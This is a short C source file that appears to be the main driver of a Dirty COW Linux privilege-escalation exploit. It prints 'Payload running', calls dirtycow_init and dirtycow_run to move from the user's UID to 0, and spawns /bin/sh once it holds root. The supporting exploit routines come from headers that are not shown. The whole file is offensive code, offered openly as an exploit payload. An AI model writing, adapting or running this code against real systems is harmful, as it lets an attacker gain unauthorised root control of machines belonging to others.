#include "exploits.h"
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

#include "main.h"

int main(int argc,char *argv[]) {
	self[0] = argv[0];
	int euid=geteuid();
	printf("Payload running\n");
	dirtycow_init(euid);
	if (euid == 0) {
		execv("/bin/sh", (char *[]){"/bin/sh"});
		return 0;
	}
	printf("From %d to 0!\n", euid);
	dirtycow_run();
	return 0;
}
